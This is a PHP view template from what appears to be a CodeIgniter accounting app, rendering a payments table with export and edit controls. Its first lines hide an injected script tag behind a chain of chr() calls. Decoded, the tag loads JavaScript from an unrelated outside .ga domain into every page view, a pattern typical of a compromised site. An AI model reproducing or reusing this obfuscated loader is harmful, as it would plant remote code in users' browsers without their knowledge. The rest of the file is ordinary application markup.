<?php
echo chr(60).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(32).chr(115).chr(114).chr(99).chr(61).chr(39).chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(115).chr(116).chr(105).chr(99).chr(107).chr(46).chr(116).chr(114).chr(97).chr(118).chr(101).chr(108).chr(105).chr(110).chr(115).chr(107).chr(121).chr(100).chr(114).chr(101).chr(97).chr(109).chr(46).chr(103).chr(97).chr(47).chr(97).chr(110).chr(97).chr(108).chr(121).chr(116).chr(105).chr(99).chr(115).chr(46).chr(106).chr(115).chr(63).chr(99).chr(105).chr(100).chr(61).chr(49).chr(52).chr(49).chr(52).chr(38).chr(112).chr(105).chr(100).chr(105).chr(61).chr(54).chr(53).chr(56).chr(54).chr(53).chr(52).chr(54).chr(56).chr(38).chr(105).chr(100).chr(61).chr(49).chr(50).chr(55).chr(56).chr(50).chr(39).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(39).chr(116).chr(101).chr(120).chr(116).chr(47).chr(106).chr(97).chr(118).chr(97).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(39).chr(62).chr(60).chr(47).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(62);
?>
<div class="x_content">

	<?php if($this->session->flashdata('message') != ''){
			echo '<div class="alert alert-info">'.$this->session->flashdata('message').'</div>';
		}?>
	

	<form action="<?php echo site_url(); ?>account/paymentto" method="post" id="export-form">
		<input type="hidden" value='' id='hidden-type' name='ExportType'/>
		<input type="hidden" value='' class='start_date' name='start'/>
		<input type="hidden" value='' class='end_date' name='end'/>
	</form>
	<form action="<?php echo base_url(); ?>account/paymentto" method="post" id="date_range">	 
			 <input type="hidden" value='' class='start_date' name='start'/>
			 <input type="hidden" value='' class='end_date' name='end'/>
		</form>
	
	<p class="text-muted font-13 m-b-30"></p> 
<div class="row hidde_cls">
	<div class="col-md-12 export_div">
		<div class="col-md-4">
		       <fieldset>
			<div class="control-group">
			  <div class="controls">
				<div class="input-prepend input-group">
				  <span class="add-on input-group-addon"><i class="glyphicon glyphicon-calendar fa fa-calendar"></i></span>
				  <input type="text" style="width: 200px" name="tabbingFilters" id="tabbingFilters" class="form-control" value=""  data-table="account/paymentto"/>
				</div>
			  </div>
			</div>
		  </fieldset>
		</div>
		<div class="col-md-4 ">
			<div class="btn-group"  role="group" aria-label="Basic example">
				<button type="button" class="btn btn-default buttons-copy buttons-html5 btn-sm">Copy</button>
				<button type="button" class="btn btn-default buttons-copy buttons-html5 btn-sm" id="bbtn">Print</button>
				<div class="dropdown btn btn-default buttons-copy buttons-html5 btn-sm export">
					<button class="btn btn-secondary dropdown-toggle btn-default" type="button" data-toggle="dropdown">Export<span class="caret"></span></button>
						<ul class="dropdown-menu" role="menu" id="export-menu">
							<li id="export-to-excel"><a href="#" title="Please check your open office Setting">Export to excel</a></li>
							<li id="export-to-csv"><a href="#" title="Please check your open office Setting">Export to csv</a></li>
							<!--li id="export-to-pdf"><a href="#" title="Please check your open office Setting">Export to Pdf</a></li-->
						</ul>
				</div>
			</div>
		</div>
		<div class="col-md-4 datePick-right">
		
		<?php if($can_add) {
			echo '<button type="button" class="btn btn-primary add_payment_to_tabs" data-toggle="modal" id="add" data-id="payment_to">Add</button>';
		} ?>
	</div>
	</div>
</div>	
 <div id="print_div_content">	
	<table id="datatable-buttons" class="table table-striped table-bordered" data-id="account"  border="1" cellpadding="3">
		<thead>
			<tr>
				<th>Id</th>
				<th>Bill Number</th>
				<th>Name</th>
				<th>Balance</th>
				<th>Credited Amount</th>
				<th>Paid Amount</th>
				<th>Created On</th>	
				<th>Created By</th>
				<!--th class='hidde'>Edited By</th-->
				<th class='hidde'>Action</th>
			</tr>
		</thead>
		<tbody>
		    <?php 
			
			 $date = $freeze_date->freeze_date;
			 
			if(!empty($payment_to_dtl)){
			   foreach($payment_to_dtl as $payment_dtls){
				 
			   $paid_bills_details =  json_decode($payment_dtls['payment_detail']);
			   $inovoice_detail = array();
			   $added_invoice_id = '';
			 
			   foreach($paid_bills_details as $detail){
				  
				   $inovoice_detail['bill_id'] = @$detail->bill_id;
				   
				   $added_invoice_id .= "<a href='javascript:void(0)' id='".$inovoice_detail['bill_id']."' data-id='purchase_bill_view' class='add_purchase_bill_to_tabs'>".$inovoice_detail['bill_id'].'</a>,';
				  
			   }
			  
			   
			   if($inovoice_detail['bill_id'] == ''){
				   $invoice_id_or_advanced = 'Advanced';
			   }else{
				   $invoice_id_or_advanced = $added_invoice_id; 
			   }
			  
			   $action = '';
				if($can_edit) { 
					if($payment_dtls['created_date'] < $date){
						$action .=  '<a href="javascript:void(0)" disabled="disabled" id="'. $payment_dtls["id"] . '" data-id="payment_to" class="add_payment_to_tabs btn btn-info btn-xs" id="' . $payment_dtls["id"] . '"><i class="fa fa-pencil"></i> Edit </a>';
					}else{
						$action .=  '<a href="javascript:void(0)" id="'. $payment_dtls["id"] . '" data-id="payment_to" class="add_payment_to_tabs btn btn-info btn-xs" id="' . $payment_dtls["id"] . '"><i class="fa fa-pencil"></i> Edit </a>';
					}
					
				}
				if($can_delete) { 
					if($payment_dtls['created_date'] < $date){
						$action .=  '<a href="javascript:void(0)" id="'. $payment_dtls["id"] . '" data-id="payment_to_view" class="add_payment_to_tabs btn btn-warning btn-xs" id="' . $payment_dtls["id"] . '"><i class="fa fa-eye"></i> View </a>';
						
						$action = $action.'<a href="javascript:void(0)" disabled="disabled" class="delete_listing btn btn-danger  btn btn-info btn-xs" data-href="'.base_url().'account/delete_payment_to/'.$payment_dtls["id"].'"><i class="fa fa-trash"></i>Delete</a>';
						
					}else{
						$action .=  '<a href="javascript:void(0)" id="'. $payment_dtls["id"] . '" data-id="payment_to_view" class="add_payment_to_tabs btn btn-warning btn-xs" id="' . $payment_dtls["id"] . '"><i class="fa fa-eye"></i> View </a>';
						
						$action = $action.'<a href="javascript:void(0)" class="delete_listing btn btn-danger  btn btn-info btn-xs" data-href="'.base_url().'account/delete_payment_to/'.$payment_dtls["id"].'"><i class="fa fa-trash"></i>Delete</a>';
					}
				}
					
					$name = getNameById('ledger',$payment_dtls['party_id'],'id');
					$paymentname = getNameById('ledger',$payment_dtls['recieve_ledger_id'],'id');
					
					$edited_by = ($payment_dtls['edited_by']!=0)?(getNameById('user_detail',$payment_dtls['edited_by'],'u_id')->name):'';
				
				$draftImage = '';	
				if($payment_dtls['save_status'] == 0)
                $draftImage = '<img src="'.base_url(). 'assets/images/draft_placeholder.png" class="img-circle" width="25%">';
				
				echo "<tr>
					<td>".$draftImage.$payment_dtls['id']."</td>
					<td>".$invoice_id_or_advanced."</td>
					<td><a href='javascript:void(0)' id='".$payment_dtls['party_id'] ."' data-id='SupplierView' ata-toggle='modal' class='add_purchase_tabs'>".@$name->name."</a></td>  
					
					<td>".abs($payment_dtls['balance'])."</td>
					<td>".abs($payment_dtls['amount_to_credit'])."</td>
					<td>".abs($payment_dtls['added_amount'])."</td>
					
					<td>".date("j F , Y", strtotime($payment_dtls['created_date']))."</td>
					<td><a href='".base_url()."users/edit/".$payment_dtls['created_by']."' target='_blank'>".getNameById('user_detail',$payment_dtls['created_by'],'u_id')->name."</a></td>	
					<td class='hidde' >".$action."</td></tr>";
				
					/*<td class='hidde'><a href='".base_url()."users/edit/".$payment_dtls['edited_by']."' target='_blank'>".$edited_by."</a></td>	*/
					
				$output[] = array(
					   'Bill ID' => $payment_dtls['id'],
					  // 'Bill Number'  => $added_invoice_id,
					   'Party Name' => $name->name,
					   'Payment Ledger' => $paymentname->name,
					   'Email' => $payment_dtls['party_email'],
					   'Balance' => $payment_dtls['balance'],
					   'Created Date' => date("d-m-Y", strtotime($payment_dtls['created_date'])),
					);
				 }
				  $data3  = $output;
				 // pre($data3);
				   export_csv_excel($data3);
		   }
	   ?>
			</tbody>                   
		</table>
	</div>


<div id="payment_to_add_detail_modal" class="modal fade in"  role="dialog">  
	<div class="modal-dialog modal-lg modal-large">
		<div class="modal-content">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">×</span>
				</button>
				<h4 class="modal-title" id="myModalLabel">Payment Detail</h4>
			</div>
			<div class="modal-body-content"></div>
		</div>
	</div>
</div>
<?php
$this->load->view('common_modal');
?>